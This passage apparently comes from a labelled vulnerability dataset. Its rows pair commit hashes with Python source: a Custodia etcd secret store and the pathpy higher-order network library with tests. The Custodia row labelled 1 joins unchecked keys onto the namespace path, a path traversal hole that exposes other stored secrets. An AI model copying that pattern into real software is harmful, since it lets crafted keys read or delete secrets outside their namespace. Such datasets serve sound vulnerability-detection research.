            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = self._absolute_key(keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(self._absolute_key(key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",0
101,101,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",1
162,162,13360e223925e21d02d6132d342c47fe53abc994,"pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH ZÃ¼rich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if v != w:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/ntests/test_HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of sequential data
    on pathways and temporal networks using higher- and multi order graphical models

    Copyright (C) 2016-2017 Ingo Scholtes, ETH ZÃ¼rich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import pathpy as pp
import pytest
import numpy as np


slow = pytest.mark.slow


def test_degrees(path_from_edge_file):
    hon_1 = pp.HigherOrderNetwork(path_from_edge_file, k=1)
    expected_degrees = {'1': 52, '2' : 0, '3': 2, '5': 5}
    for v in hon_1.nodes:
        assert expected_degrees[v] == hon_1.outweights[v][1], \
        ""Wrong degree calculation in HigherOrderNetwork""


def test_distance_matrix(path_from_edge_file):
    p = path_from_edge_file
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for source in sorted(d_matrix):
        for target in sorted(d_matrix[source]):
            distance = d_matrix[source][target]
            if distance < 1e6:
                distances.append(d_matrix[source][target])

    assert np.sum(distances) == 8
    assert np.min(distances) == 0
    assert np.max(distances) == 2


def test_distance_matrix_equal_across_objects(random_paths):
    p1 = random_paths(40, 20, num_nodes=9)
    p2 = random_paths(40, 20, num_nodes=9)
    hon1 = pp.HigherOrderNetwork(paths=p1, k=1)
    hon2 = pp.HigherOrderNetwork(paths=p2, k=1)
    d_matrix1 = hon1.getDistanceMatrix()
    d_matrix2 = hon2.getDistanceMatrix()
    assert d_matrix1 == d_matrix2


@pytest.mark.parametrize('paths,n_nodes,k,e_var,e_sum', (
        (7, 9, 1, 0.7911428035, 123),
        (20, 9, 1, 0.310318549, 112),
        (60, 20, 1, 0.2941, 588),
))
def test_distance_matrix_large(random_paths, paths, n_nodes, k, e_var, e_sum):
    p = random_paths(paths, 20, num_nodes=n_nodes)
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for i, source in enumerate(sorted(d_matrix)):
        for j, target in enumerate(sorted(d_matrix[source])):
            distance = d_matrix[source][target]
            if distance < 1e16:
                distances.append(d_matrix[source][target])

    assert np.var(distances) == pytest.approx(e_var)
    assert np.sum(distances) == e_sum


def test_shortest_path_length(random_paths):
    N = 10
    p = random_paths(20, 10, N)
    hon = pp.HigherOrderNetwork(p, k=1)
    shortest_paths = hon.getShortestPaths()
    distances = np.zeros(shape=(N, N))
    for i, source in enumerate(sorted(shortest_paths)):
        for j, target in enumerate(sorted(shortest_paths[source])):
            distances[i][j] = len(shortest_paths[source][target])
    assert np.mean(distances) == 1.47
    assert np.var(distances) == pytest.approx(0.4891)
    assert np.max(distances) == 4


def test_node_name_map(random_paths):
    p = random_paths(20, 10, 20)
    hon = pp.HigherOrderNetwork(p, k=1)
    node_map = hon.getNodeNameMap()
    # TODO: this is just an idea of how the mapping could be unique
    assert node_map == {str(i): i+1 for i in range(20)}
/n/n/n",0
163,163,13360e223925e21d02d6132d342c47fe53abc994,"/pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH ZÃ¼rich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
